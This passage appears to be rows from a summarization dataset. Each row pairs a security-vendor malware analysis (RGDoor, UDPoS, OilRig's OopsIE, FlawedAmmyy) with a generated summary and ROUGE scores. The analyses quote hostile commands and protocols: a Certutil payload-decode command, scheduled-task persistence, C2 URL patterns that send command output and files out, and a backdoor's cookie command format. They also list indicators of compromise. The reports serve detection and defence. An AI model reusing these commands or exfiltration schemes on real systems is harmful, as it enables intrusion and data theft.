of inbound HTTP requests, which would contain commands issued by actors to RGDoor. To see inbound RGDoor requests, an administrator must configure logging of Cookie fields in IIS, which can be selected in the W3C Logging Fields dialog in IIS Manager, as seen in Figure 7.Figure 7 W3C Logging Fields dialog in IIS Manager with Cookie fields enabledThe HTTP requests sent by the client to the RGDoor backdoor in the testing above will generate logs on the IIS server. Without the Cookie field logged, it is difficult to locate and analyze inbound requests related to RGDoor. Remember that RGDoor is an IIS module that checks all inbound POST requests for commands, so an actor does not need to use one particular URL to interact with RGDoor. However, the following shows the IIS log generated from the first testing request we made using our RGDoor client, which shows the ""RGSESSIONID="" string, the ""54"" key and the Base64 encoded command within the Cookie field:Software: Microsoft Internet Information Services 7.5 Version: 1.0 Date: 2017-10-03 19:30:13 Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Cookie) sc-status sc-substatus sc-win32-status time-taken 2017-10-03 19:30:13 192.168.45.5 POST / - 80 - 192.168.45.1 python-requests/2.13.0 RGSESSIONID=54NzkwcCM8OzU5PQ== 200 0 0 28 1 2 3 4 5 Software: Microsoft Internet Information Services 7.5 Version: 1.0 Date: 2017-10-03 19:30:13 Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Cookie) sc-status sc-substatus sc-win32-status time-taken 2017 - 10 - 03 19 : 30 : 13 192.168.45.5 POST / - 80 - 192.168.45.1 python - requests / 2.13.0 RGSESSIONID = 54NzkwcCM8OzU5PQ == 200 0 0 28ConclusionRGDoor is an IIS backdoor that actors used the TwoFace webshell to load onto an IIS web server. The RGDoor provides backdoor access to the compromised server, which we speculate the actors loaded in order to regain access to the server in the event the TwoFace webshell was removed. This backdoor has a rather limited set of commands, however, the three commands provide plenty of functionality for a competent backdoor, as they allow an actor to upload and download files to the sever, as well as run commands via command prompt. The use of RGDoor suggests that this group has contingency plans to regain access to a compromised network in the event their webshells are discovered and remediated.Palo Alto Networks customers are protected from RGDoor by the following:All RGDoor samples have malicious verdicts in WildFireAutoFocus customers can investigate this activity with the RGDoor tagIPS Signature RGDoor.Gen Command and Control Traffic (ID 11885) detects RGDoor network trafficIndicators of CompromiseRGDoor SHA256497e6965120a7ca6644da9b8291c65901e78d302139d221fcf0a3ec6c5cf9de3a9c92b29ee05c1522715c7a2f9c543740b60e36373cb47b5620b1f3d8ad96bfaRGDoor FilenamesHTTPParser.dllTrafficHandler.dlliishandler6.dll";"RGDoor is an IIS HTTP module that is installed by the threat actor using the TwoFace webshell. Once installed, RGDoor is notified immediately when the IIS server receives an inbound HTTP POST request. RGDoor parses inbound HTTP POST requests, specifically looking for the HTTP ""Cookie"" field by accessing the HTTP header with the following function call:pHttpContext>GetRequest()>GetHeader(""Cookie"",NULL)After accessing the cookie field, RGDoor parses this field by looking for the string ""RGSESSIONID="", which is the basis for the name RGDoor. If present, the code uses the twocharacter bytes as a single hexadecimal byte. The key is followed by a Base64 encoded string that contains ciphertext. The following represents the structure of the cookie filed in inbound RGDoor requests:RGSESSIONID=[twobytes for key][Base64 encoded ciphertext]RGDoor decodes the Base64 encoded string and then decrypts the decoded string using a custom algorithm. The custom algorithm iterates through the ciphertext using the 'pxor' instruction to XOR each byte of ciphertext with the singlebyte hexadecimal value from the twobyte character key provided in the cookie field.The code will parse the cleartext looking for one of three commands: ""cmd$"", ""upload$"" and ""download$"". The code treats the string immediately following the command as the command's argument. Table 1 provides the arguments and further details on the three commands.Command Description cmd$[command to execute] Uses ""popen"" to run the specified command. It enters a loop that calls ""fgets"" to get the command results. The loop finishes when a call to ""feof"" designates the end of the command results, which are relayed back to the actor via the HTTP response. upload$[path to file] Gets the length of uploaded data by checking the ""ContentLength"" field within the HTTP request. Uses the IHttpRequest::Get RGDoor responded to this command with ""write done"", which is interesting as the response was in cleartext and not encrypted using the custom algorithm. RGDoor is an IIS backdoor that actors used the TwoFace webshell to load onto an IIS web server. The RGDoor provides backdoor access to the compromised server, which we speculate the actors loaded in order to regain access to the server in the event the TwoFace webshell was discovered and remediated. The use of RGDoor suggests that this group has contingency plans to regain access to a compromised network in the event their webshells are discovered and remediated.";en;{'r': 0.2649310872894334, 'p': 0.9505494505494505, 'f': 0.41437125407591524};{'r': 0.20647773279352227, 'p': 0.9216867469879518, 'f': 0.3373759617283678};{'r': 0.2649310872894334, 'p': 0.9505494505494505, 'f': 0.41437125407591524}
https://www.forcepoint.com/blog/x-labs/udpos-exfiltrating-credit-card-data-dns;UDPoS - exfiltrating credit card data via DNS;Point of Sale malware has been around for some time and has been deployed against a broad range of businesses from retailers to hotel groups. However, this appears to be a new family which we are currently calling 'UDPoS' owing to its heavy use of UDP-based DNS traffic. At the time of writing, it's unclear whether the malware is currently being used in campaigns in the wild, although the coordinated use of LogMeIn-themed filenames and C2 URLs, coupled with evidence of an earlier Intel-themed variant, suggest that it may well be.Note: We have been in contact with LogMeIn throughout this investigation to help determine whether their services or products may have been abused as part of the malware deployment process. No evidence of this was found and it appears that the use of LogMeIn-themed filenames and C2 domain by the actors behind the malware is a simple 'camouflage' technique.Update: LogMeIn have published an advisory notice to their customers re-iterating the above. You can read their statement here.A set of two - service & monitorBehavioural analysis of the initial sample we discovered, a file named logmeinumon.exe, showed it contacting a similarly LogMeIn-themed C2 server hosted by a Swiss-based VPS provider (details below - note the use of an 'L' rather than an 'I' in the spelling of logmeln).Investigation of the C2 revealed it also to be hosting the original dropper file, update.exe. This file is a 7-Zip self-extracting archive containing LogmeinServicePack_5.115.22.001.exe and logmeinumon.exe. Details of these files are in the table below.Both of the LogMeIn-themed files have a compilation timestamp of 25 October 2017, suggesting that this is a relatively recent campaign.Upon executing update.exe, its content is extracted to the %TEMP% directory and LogmeinServicePack_5.115.22.001.exe automatically launched using 7-Zip's built in RunProgram feature.LogmeinServicePackLogmeinServicePack_5.115.22.001.exe - which we have called the service component - is responsible for setting up the malware by placing files into the System32\LogMeInUpdService directory and creating a new system service for persistence. It does this via a batch file with a semi-random filename embedding standard Windows commands for file and service operations. Once finished it passes over execution to the monitoring component by launching logmeinumon.exe.This monitoring component has an almost identical structure to the service component. It's compiled by the same Visual Studio build and uses the same string encoding technique: both executables contain only a few identifiable plain-text strings, and instead use a basic encryption and encoding method to hide strings such as the C2 server, filenames, and hard-coded process names.Evasive manoeuvresDespite maintaining a small footprint - only 88kb in size - the monitor component is a multi-threaded application which creates five different threads after its initialisation code is completed. This initialisation code is mainly responsible for decrypting and decoding the malware's internal strings, attempting to carry out an anti-AV/VM check, and either creating or loading an existing 'Machine ID' stored in a file called hdwid.dat in the same directory where the executables are deployed. This randomly generated identifier is used as {Machine ID} in all of the DNS queries detailed within this blog.For the anti-AV and anti-VM solution, there are four DLL and three Named Pipe identifiers stored in both service and monitor components:However, only the monitor component makes use of these and, moreover, the code responsible for opening module handles is flawed: it will only try to open cmdvrt32.dll - a library related to Comodo security products - and nothing else.It is unclear at present whether this is a reflection of the malware still being in a relatively early stage of development/testing or a straightforward error on the part of the developers.Initialisation & evasionAfter initialisation, including after reboots, the monitor component performs a DNS query on the embedded C2 address and retrieves the external IP address of the infected machine via an HTTP GET request:{C2URL}/index.php/?udpool={Machine ID}The first time the malware is run, it also generates a batch file called infobat.bat which is similar in structure to the one examined for the service component. Again, this file uses a number of standard Windows commands to create a comprehensive fingerprint of the infected machine containing network, system, route, and process related information. This data is written to a local file called PCi.jpg and sent to the C2 server via DNS. Once complete, a flag is set in hdwid.dat.Whether this is intended for use later for lateral movement is unclear, but this information alone would be sufficient to treat this executable as malicious: the network map, list of running processes and list of installed security updates is highly valuable information.DNS comms & post setup functionalityAfter the initial HTTP request to determine its external IP address, the monitor component appears to communicate exclusively via fake DNS requests, all of which follow the format{Machine ID}.{Message Type}.xxxx.xxxx.xxxx.xxxxwhere {Machine ID} is always 15 characters long, {Message Type} is taken from a set of pre-defined strings, and the actual message components 'xxxx' can vary in length, but never exceed 31 characters.Our analysis identified five possible values for the {Message Type} field: bin, info, ping, trp, and note.The bin messages are used to transmit the initial burst of data gathered into PCi.jpg by the infobat.bat process, while ping is a heartbeat message sent to the C2 every 60 minutes.Info messages - as the name suggests - are purely informational and are despatched alongside ping messages:{PCNAME}, {USERNAME}, [NS:IP {C2URL}:{C2IP}]The note and trp message types required further analysis and relate to the core functionality of the malware. Investigating the functionality spread across the additional threads revealed a process designed to collect Track 1 and Track 2 payment card data by scraping the memory of running processes. These processes are checked against an embedded and pre-defined blacklist of common system process and browser names with only ones not present on the list being scanned.If Track 1/2 data is found in memory it will be extracted as is, converted to and sent as a trp message. A note message will be also generated and transmitted with the following content:[IP : {ipaddr} ] - String found in: {processname} -The malware further logs this process name to a file called sinf.dat, the number of total processes with successful extraction to hdwid.dat and saves a hash of the trp message to udwupd.kdl, presumably for the purpose of keeping track of what has already been submitted to the C2 server.All five message types are logged to the {Machine ID}.dat file prior to transmission.TimelinesAs the underlying intent of the malware became clear to us, we attempted to identify further samples from the same family to determine whether this was something new (and possibly still being tested before deployment) or part of an ongoing campaign.These efforts revealed another service component, but unfortunately not the corresponding monitor nor the parent 7-Zip SFX archive. Interestingly, this second service component was named 'Intel Upgrade Services' and apparently intended to masquerade as an Intel update as opposed to a LogMeIn update.Based on the compilation dates of the executables, the Intel-themed sample was created two weeks prior to the LogMeIn-themed one on 11 October 2017. Whether this is a sign that authors of the malware were not successful in deploying it at first or whether these are two different campaigns cannot be fully determined at this time due to the lack of additional executables.Design decisions and detection rateThe coding style and techniques seen within the malware can hardly be described as outstanding. Beyond the faulty evasion code noted above, using data files written to disk instead of working predominantly in memory - besides leaving unnecessary trails - is rarely the trademark of bleeding edge malware and, equally, there are more advanced ways of fingerprinting a PC and generating a report. That said, the method used in this sample does appear to get the job done.On the other hand, DNS-based communication and data exfiltration is genuinely unusual - although not unique - and can be quite effective. Nearly all companies have firewalls and other protections in place to monitor and filter TCP- and UDP-based communications, however DNS is still often treated differently providing a golden opportunity to leak data.The overall impression is of a piece of malware inspired by the success of (and some of the better ideas and techniques employed by) its predecessors.Detection rates for the malware are still very low for the monitor component at the time of writing. Visibility is always an issue when it comes to non-traditional malware: samples which do not target standard endpoints or servers can quite easily be missed because of the lack of focus on protecting these sorts of systems.ConclusionDiscovering a unique piece of malware is a rare event these days and UDPoS, while unusual, is not a new concept. There have been several Point of Sale malware families identified over the past few years, all with the same goal: harvesting credit card data on a large scale - consider how many different cards may be used in stores, bars, or restaurants across the course of a day, let alone weeks or months.From a consumer standpoint, protecting oneself against this sort of threat can be a tricky proposition for individuals: a PoS terminal could conceivably remain infected for significant lengths of time. However, enabling reporting on your credit card activity (many banks offer SMS, Push, and email alerts) can greatly reduce the time of discovery - and therefore recovery - if abuse does occur.For many businesses, the situation may not be much better: legacy PoS systems are often based on variations of the Windows XP kernel and, in large retailers, may be present on hundreds or even thousands of devices. While Windows POSReady is in extended support until January 2019, it is still fundamentally an operating system which is seventeen years old this year.As UDPoS highlights, exfiltrating stolen credit card data can and will result in unusual patterns of activity on the machines (DNS traffic in this case). By identifying and reacting to these patterns, businesses - both PoS terminal owners and suppliers - can close down this sort of attack sooner.Protection statementForcepoint customers are protected against this threat at the following stages of attack:Stage 5 (Dropper File) - Malicious files are prevented from being downloaded.Stage 6 (Call Home) - Attempts to contact the C2 server are blocked.Indicators of CompromiseC2 Serverhxxp://service-logmeln[.]network/10/update.exe service-logmeln.networkSHA1 File Hashes195453b2dc788d393670db611116dcbc3994a1b4 ba3dc114f848a60f7af83533580b08c682d6f280 d9f58b3c17a2a7b689bb3ed42bce6a5eb7855569 aab16598debb234a9a3732e45d1d1ef369da27d1;"The ITSecurity report has been summarized as follows: ""Whether this is a sign that authors of the malware were not successful in deploying it at first or whether these are two different campaigns cannot be fully determined at this time due to the lack of additional executables.Design decisions and detection rateThe coding style and techniques seen within the malware can hardly be described as outstanding. Beyond the faulty evasion code noted above, using data files written to disk instead of working predominantly in memory besides leaving unnecessary trails is rarely the trademark of bleeding edge malware and, equally, there are more advanced ways of fingerprinting a PC and generating a report. That said, the method used in this sample does appear to get the job done.On the other hand, DNSbased communication and data exfiltration is genuinely unusual although not unique and can be quite effective. Nearly all companies have firewalls and other protections in place to monitor and filter TCP and UDPbased communications, however DNS is still often treated differently providing a golden opportunity to leak data.The overall impression is of a piece of malware inspired by the success of (and some of the better ideas and techniques employed by) its predecessors.Detection rates for the malware are still very low for the monitor component at the time of writing. Visibility is always an issue when it comes to nontraditional malware: samples which do not target standard endpoints or servers can quite easily be missed because of the lack of focus on protecting these sorts of systems.From a consumer standpoint, protecting oneself against this sort of threat can be a tricky proposition for individuals: a PoS terminal could conceivably remain infected for significant lengths of time. However, enabling reporting on your credit card activity (many banks offer SMS, Push,";en;{'r': 0.24327628361858192, 'p': 0.961352657004831, 'f': 0.3882926797034908};{'r': 0.17548387096774193, 'p': 0.9283276450511946, 'f': 0.29517091430907344};{'r': 0.24327628361858192, 'p': 0.961352657004831, 'f': 0.3882926797034908}
https://unit42.paloaltonetworks.com/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/;OopsIE! OilRig Uses ThreeDollars to Deliver New Trojan;"This post is also available in: ??? (Japanese)The OilRig group remains highly active in their attack campaigns while they continue to evolve their toolset. On January 8, 2018, Unit 42 observed the OilRig threat group carry out an attack on an insurance agency based in the Middle East. Just over a week later, on January 16, 2018, we observed an attack on a Middle Eastern financial institution. In both attacks, the OilRig group attempted to deliver a new Trojan that we are tracking as OopsIE.The January 8 attack used a variant of the ThreeDollars delivery document, which we identified as part of the OilRig toolset based on attacks that occurred in August 2017.However, the attack on January 16 did not involve ThreeDollars at all. Instead, this attack involved delivering the OopsIE Trojan directly to the victim, most likely using a link in a spear phishing email. Interestingly, the targeted organization in the January 16 attack had already been targeted by the OilRig group a year ago on January 2017. This repeat attack may suggest that the adversaries have lost their foothold in the targeted organization, or that it may be considered a high value target.A New AttackOn January 8, 2018, the OilRig threat group sent an email with the subject Beirut Insurance Seminar Invitation to an insurance agency in the Middle East. The OilRig group sent two emails to two different email addresses at the same organization within a six minutes time span. The recipient email addresses suggest they may be the addresses used for specific regional branches of the targeted organization.Both emails originated from the same address. The email address is associated with the Lebanese domain of a major global financial institution. However, based upon the captured session data, it is highly likely the source email address was spoofed. The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars. Examining this sample of ThreeDollars reveals that it contains a new payload, which we have named OopsIE.In the January 16, 2018 attack, we observed OilRig attacking an organization it previously targeted in January 2017. In this case, the ThreeDollars delivery document was not used and instead an attempt was made to deliver the OopsIE Trojan directly to the targeted organization, likely via a link within an email. The Trojan was directly downloaded from the command and control server for OopsIE, signifying that this server was also used for staging. This suggests that due to the January 2017 attack, the targeted organization may have taken actions to counter known OilRig TTPs, in this case delivering malicious macro documents, causing the OilRig operators to adopt a different delivery tactic.We also identified another sample of ThreeDollars, created on January 15, 2017 with the file name strategy preparation.dot. While this sample was very similar to the Seminar-Invitation.doc sample it also had some significant differences. The primary difference was that this sample was encrypted and password protected, requiring the victim to enter in a password which was likely provided by the adversary to view the document. While this is not a new tactic, this is the first instance where we have observed the OilRig using it in their playbook. Typically, password protected documents is commonly used by adversaries as an evasion tactic to bypass automated analysis mechanisms due to the password requirement for successful execution. As we have observed throughout our tracking of the OilRig group, adopting proven tactics has been a common behavior over time.ThreeDollars Document AnalysisThe samples of ThreeDollars we collected in these attacks are structurally very similar to the first sample we analyzed in October 2017, down to the lure image used to trick the recipient into clicking the ""Enable Content"" button to execute the malicious macro. The images used in the January 2018 attacks were the exact same in each sample, verified by file hash.Figure 1 shows the lure image extracted from the newer attacks, and the lure image from the first sample we analyzed. While it is unsurprising that attacks originating from the same adversary group would use the same resource over time, we analyzed exactly how similar these lure images were.Figure 1 Side-by-side of the lure images within ThreeDollars in the October 2017 and the January 2018 attacksSuperficially, we can immediately see the images are quite similar, but with some glaring differences. The image from the August 2017 attack for example, is significantly larger, using an image resolution of 3508 pixels x 4961 pixels which is also the exact resolution for a sheet of A3 paper at 300 dpi. It also contains some additional artifacts in the image, such as the inclusion of the Microsoft logo as well as additional text, specifically ""against unauthorized use"". In comparison, the newer lure image appears to be horizontally distorted due to it being resized to fit into the constraints of the document. In addition, the period after ""This document is protected"" is misaligned.By overlaying these two lure images and accounting for the newer image's distortion, we are able to clearly visualize that the newer image is highly likely to be a cropped and edited version of the August 2017 image.Examining the color code used in both images also shows they are the exact same, da3b01. The dimensions of the newer image are roughly 40% of the older October image, suggesting that after cropping and editing the newer image, the creator is also likely to have resized the image. One peculiar artifact from the original image is the usage of the ""st"" (unicode \uFB06) ligature in the word ""against"". This is a highly uncommon glyph and is not generally available in standard keyboard layouts. This may suggest that the string was machine generated rather than directly inputted from a keyboard. The use of this glyph also may suggest that the actor is not a native English speaker.Malicious Macro AnalysisWhen the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the ""Enable Content"" button. When button is clicked, a malicious macro is silently run which installs then executes a payload on a system. A decoy image is also displayed to the victim to lower suspicion of malicious activity. The decoy message that is eventually presented to the victim does not actually show the expected content of an insurance seminar invitation as presented in the delivery email. Instead, it displays a fake error message of NullRefrencedException! error has occurred in user32.dll by 0x32ef2121 within the Word document, as seen in Figure 2.Figure 2 Decoy message displayed by the malicious macro in ThreeDollars delivery documentWhile the decoy in Figure 2 is displayed, the macro will search the document for the delimiter $$$ and write the base64 encoded text that follows this delimiter to the file %APPDATA%\Base.txt. The macro then creates a scheduled task named SecurityAssist that runs after waiting one minute. The SecurityAssist task is responsible for running the following command line command that uses the Certutil application to decode the base64 encoded data in Base.txt and saves the decoded data to the file %PROGRAMDATA%\IntelSecurityAssistManager.exe:cmd.exe /c Certutil -decode %appdata%\Base.txt %programdata%\IntelSecurityAssistManager.exe & SchTasks /Delete /F /TN SecurityAssistThe macro also creates a second scheduled task named Conhost that waits two minutes and runs a VBScript %APPDATA%\chkSrv.vbs. The macro saves the chkSrv.vbs script to the system, which is responsible for running the IntelSecurityAssistManager.exe payload (OopsIE Trojan) and cleaning up the installation by deleting the two scheduled tasks, the Base.txt file, the ThreeDollars document, and the chkSrv.vbs script.OopsIE Trojan AnalysisThe OopsIE Trojan delivered in these attacks is packed with SmartAssembly and further obfuscated with ConfuserEx v1.0.0. To run persistently on the system, the Trojan will first create a VBScript file:SpecialFolder.CommonApplicationData\srvResesponded.vbsthat contains:CreateObject(""WScript.Shell"").Run(""%app%"")The Trojan replaces the %app% string in the above VBScript with the path to its executable. Finally, the Trojan creates a scheduled task to run itself every three minutes by running the following command on the command prompt after replacing the %path% string with the path to the srvResesponded.vbs VBScript:SchTasks /Create /SC MINUTE /MO 3 /TN ""InetlSecurityAssistManager"" /TR ""wscript %path%"" /fThe Trojan uses HTTP to communicate with its C2 server, specifically using the InternetExplorer application object within an embedded Microsoft .NET Framework assembly called Interop.SHDocVw. The Trojan extracts and loads this embedded assembly by concatenating the contents of two resources named S1 and S2 and decompresses the resulting data using the GZipSteam class. The resulting Interop.SHDocVw .NET assembly is packed with SmartAssembly and further obfuscated using Confuser v1.9.0.0. The concatenation of resources to construct embedded assemblies is not a new technique for the OilRig group, as they used the very same technique in October 2017 in their ISMInjector tool to construct its embedded libraries Joiner.dll and Inner.dll.By using the InternetExplorer application object, all C2 related requests will look as if they came from the legitimate browser and therefore will not contain any anomalous fields within the request, such as custom User-Agents. The OopsIE Trojan is configured to use a C2 server hosted at:www.msoffice365cdn[.]comThe Trojan will construct specific URLs to communicate with the C2 server and parses the C2 server's response looking for content within the tags <pre> and </pre>. The initial HTTP request acts as a beacon, as shown in the image below.As seen in the above request, the Trojan will generate a URL for its beacon with the following structure:http://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)>The Trojan will issue a request to this URL to check (hence the chk string in the URL) to see if the C2 server has a command for the Trojan to run. The C2 server will respond to the Trojan's request by echoing the value <hex(Environment.UserName/Environment.MachineName)> if it wishes to provide additional commands. If the C2 server does not respond with the appropriate echoed data, the Trojan will create a file named srvCheckresponded.tmp in the SpecialFolder.CommonApplicationData folder and write nothing to it before exiting.If the C2 server provides the appropriate echoed data in the response, the Trojan attempts to determine what commands the C2 wishes to run by issuing a request to the following URL:http://<c2 domain>/what?<hex(Environment.UserName/Environment.MachineName)>After issuing the what command, the Trojan will parse the C2's response for the string Oops, which the Trojan will treat as the C2 making a mistake and will exit. Otherwise, the Server will respond with a command followed by a set of parameters, split up by the delimiter <>:[command]<>[parameters for command in hexadecimal format]The available commands are:Command Description 1 Run command 2 Upload a file 3 Download a specified fileThe parameters for each command are issued in hexadecimal format. For instance, the character A would be represented by the two characters 41, which is the hexadecimal representation of that character. This hexadecimal format is used extensively throughout this Trojan.The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\tmpCa.vbs. The Trojan will then read the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server via an HTTP GET request to a URL with the following structure:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt output)>The upload command (2) writes data provided by the C2 to a specified file. The parameters supplied to this command include hexadecimal values for the binary data and the filename, which are split up by a delimiter of (!). The Trojan will respond to the C2 to notify it of a successful upload by sending a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(""File Uploaded"")>The download command (3) reads the contents of a specified file and sends the data to the C2 server. If the file does not exist, the Trojan will send the C2 server a message < File Not Found > by sending the following URL:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(""< File Not Found >"")>If the file exists, the Trojan will read the contents of the specified file and compresses the contents using the GZipStream class. The Trojan then gets the hexadecimal values of the compressed data and will replace the following hexadecimal values on each line with ASCII characters to further compressed the data:String of hexadecimal values Character replacement 000000 z 00000 x 0000 y 000 g 00 w 01 tThe Trojan then writes 1500 bytes of the hexadecimal formatted data, one per line to a temporary file in the SpecialFolder.CommonApplicationData folder named as:<day><hour><second><millisecond>.tmpThe Trojan will then read each line from this temporary file and send them to the C2 server by issuing requests to a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>ABZ<hex(1500 characters of hexadecimal formatted file contents)>Once all of the lines of hexadecimal formatted data in the temporary file are sent to the C2 server, the Trojan will send a request to the C2 server to notify the data has been successfully transmitted via a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>ABZFinishOverlaps with Previous OilRig Group AttacksSince May 2016, we have continued to monitor and uncover various attacks and tools associated with the OilRig group. As we discover new tools used by this group, we have consistently discovered overlapping artifacts with previously used tools and infrastructure. This type of commonality is unsurprising as we are assuming a single adversary, and is an excellent example of how adversaries will often times reuse certain tactics and techniques whether it is for efficiencies sake or sheer laziness.In the attacks described above, we observed a new payload being delivered using a previously unknown command and control domain. However, as we continued to follow the trail of evidence, we found immediate links to past attacks and common artifacts from the OilRig group. The most obvious link is the reuse of the ThreeDollars delivery document, which we had previously observed delivering a different payload. However, we also found other connection to other OilRig group attacks starting with the command and control domain, msoffice365cdn[.]com.Beginning with the WHOIS record, we see that the domain was registered by emilia.jones@mail.ru. Examining additional domains registered to this email address reveals the domain office365-management[.]com, which we previously identified in October 2017 to be an OilRig C2. Continuing to examine the WHOIS records, we see that a fairly unique phone number is also used in the record. It is only found in one other WHOIS record, for the domain office365-technical[.]info, which is registered to leonard.horner@mail.ru. Based off the relational links and thematic similarity of the domain name, we have strong reason to believe this domain and registrant are also attributed to the OilRig group.Moving onto IP resolutions of the identified domains proves to be fruitful as well. Msoffice365cdn[.]com resolves to 80.82.79.221, which resides on the same class C network range as the IP resolution of office365-technical[.]info, which resolves to 80.82.79.240. In addition, we find that 80.82.79.221 shares an SSL certificate with a small number of other IP addresses, one of which is 185.162.235.29. This IP resolves to office365-management[.]com which was one of the domains registered by the emilia.jones@mail.ru entity. Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017.Lastly, we examine the delivery document itself. Although we have already identified the documents as a variant of the ThreeDollars tool and analyzed the lure image used in this document in comparison to the previously used lure image, additional artifacts also exist to further strengthen the relational link of this sample and the attack to previous OilRig attributed tools and attacks. In this case, one of the ThreeDollars samples we collected contained a unique author name of J-Win-7-32-Vm. We had previously observed this author name in use once before, in the very first ThreeDollars document we collected that we had reported on in August 2017.ConclusionThe OilRig group continues to remain a highly active adversary in the Middle East region. This group has repeatedly shown evidence of a willingness to adapt and evolve their tactics, while also reusing certain aspects as well. We have now observed this adversary deploy a multitude of tools, with each appearing to be some form of iterative variation of something used in the past. However, although the tools themselves have morphed over time, the plays they have executed in their playbook largely remain the same when examined over the attack life cycle. We have added this play to the OilRig playbook, which can be viewed online via our Playbook Viewer.Palo Alto Networks customers are protected from this threat by:WildFire detects all ThreeDollars and OopsIE payloads with malicious verdicts. AutoFocus customers can track these tools with the ThreeDollars and OopsIE Traps blocks the ThreeDollars delivery documents and the OopsIE payload. PanAV detects the ThreeDollars samples as Virus/Win32.WGeneric.pefia and the OopsIE payload as Virus/Win32.WGeneric.pipwfIndicators of CompromiseThreeDollars SHA256ec3f55cac3e8257d6d48e5d543db758fed7d267f14f63a6a5d98ba7a0fab687081eb43ad46ed39bd4b869c709e5e468a6fc714485da288aaa77c80291ce6db8cOopsIE SHA2569a040cdd7c9fcde337b2c3daa2a7208e225735747dd1366e6c0fcbc56815a07f231115a614c99e8ddade4cf4c88472bd3801c5c289595fc068e51b77c2c8563fOopsIE C2www.msoffice365cdn[.]comRelated Infrastructureoffice365-management[.]comoffice365-technical[.]infomsoffice-cdn[.]com80.82.79.22180.82.79.240185.162.235.29";The OilRig group continues to remain a highly active adversary in the Middle East region. This group has repeatedly shown evidence of a willingness to adapt and evolve their tactics, while also reusing certain aspects as well. We have now observed this adversary deploy a multitude of tools, with each appearing to be some form of iterative variation of something used in the past. However, although the tools themselves have morphed over time, the plays they have executed in their playbook largely remain the same when examined over the attack life cycle. We have added this play to the OilRig playbook, which can be viewed online via our Playbook Viewer.;en;{'r': 0.08550573514077164, 'p': 1.0, 'f': 0.1575408246774097};{'r': 0.0485921889191644, 'p': 1.0, 'f': 0.09268081332142421};{'r': 0.08550573514077164, 'p': 1.0, 'f': 0.1575408246774097}
https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware;Ammyy Admin Malware - FlawedAmmy Download;"Proofpoint StaffOverviewProofpoint researchers have discovered a previously undocumented remote access Trojan (RAT) called FlawedAmmyy that has been used since the beginning of 2016 in both highly targeted email attacks as well as massive, multi-million message campaigns. Narrow attacks targeted the Automotive industry among others, while the large malicious spam campaigns appear to be associated with threat actor TA505, an actor responsible for many large-scale attacks since at least 2014.Delivery AnalysisMarch 5, 2018FlawedAmmyy Admin appeared most recently as the payload in massive email campaigns on March 5 and 6, 2018. The messages in these campaigns contained zipped .url attachments and both the messages and the delivery suggest they were sent by threat actor TA505, known for sending large-scale Dridex, Locky, and GlobeImposter campaigns, among others, over the last four years.For example, on March 5, the messages were sent from addresses spoofing the recipient's own domain with subjects such as ""Receipt No 1234567"" (random digits, and first word could also be ""Bill"" or ""Invoice"") and matching attachments ""Receipt 1234567.zip"". The attachments were ZIP archives containing "".url"" files with names such as ""B123456789012.url"". Again, these were apparently random digits (Figure 1).Figure 1: Sample email from March 5, 2018, Ammyy Admin malware campaignFigure 2: Contents of the .url fileThe .url files are interpreted by Microsoft Windows as ""Internet Shortcut"" files [1], examples of which can be found in the ""Favorites"" folder on Windows operating systems. This type of file can be created manually [2], they are intended to serve as links to internet sites, launching the default browser automatically. However, in this case the attacker specified the URL to be a ""file://"" network share instead of the typical http:// link. As a result, the system downloads and executes a JavaScript file over the SMB protocol rather than launching a web browser if the user clicks ""Open"" on the warning dialog shown in Figure 3.`Figure 3: Warning dialog displayed after double-clicking the .url fileThis JavaScript in turn downloads Quant Loader, which, in this case, fetched the FlawedAmmyy RAT as the final payload. The use of "".url"" files and SMB protocol downloads is unusual, and this is the first time we have seen these methods combined.March 1, 2018The FlawedAmmyy RAT previously appeared on March 1 in a narrowly targeted attack. Emails contained an attachment 0103_022.doc (Figure 4), which used macros to download the FlawedAmmyy malware directly. This sample used the same command and control (C&C) address as the sample from the massive campaign on March 5.Figure 4: Screenshot of the document attachment from March 1, 2018, FlawedAmmyy campaignJanuary 16, 2018We also observed this RAT in a narrowly targeted attack that included the automotive industry. Emails contained the attachment 16.01.2018.doc which used macros to download the FlawedAmmyy RAT directly.Malware AnalysisFlawedAmmyy is based on leaked source code for Version 3 of the Ammyy Admin remote desktop software. As such FlawedAmmyy contains the functionality of the leaked version, including:Remote Desktop controlFile system managerProxy supportAudio ChatFigure 5: Strings from the analyzed January 16 sample contain references to the leaked Ammyy Admin Version 3Figure 6: Snippet of Ammyy Admin Version 3 source code, file TrMain.cppThe FlawedAmmyy C&C protocol occurs over port 443 with HTTP. In the initial handshake, sent by the client to the server, the first byte is always ""="", followed by 35 obfuscated and SEAL-encrypted bytes. After a server response (0x2d00), the infected client sends the second packet. This packet has a 5-byte header that includes the length of the rest of the packet (0x78). The body of this packet contains cleartext key-value pairs:Figure 7: Screenshot of FlawedAmmyy C&C protocol from WiresharkTable 1: Explanation of the key-value pairs sent by the infected client in the second packetParameter Explanation Example Value id 8 digit number, the first digit always being '5' and the remaining 7 chosen at random on initialization of the malware 53466221 os Operating system 7 SP1 x86 priv Privilege Admin cred Username DOMAIN\Username1 pcname Computer name Computer3 avname Antivirus product name obtained via WMI query Windows Defender card 1 if a usable smart-card is inserted into a reader, 0 otherwise 1 build_time Malware build time, obtained at runtime by reading the PE timestamp field from its file on disk 14-01-2018 6:34:27 20-02-2018 16:43:10ConclusionAmmyy Admin is 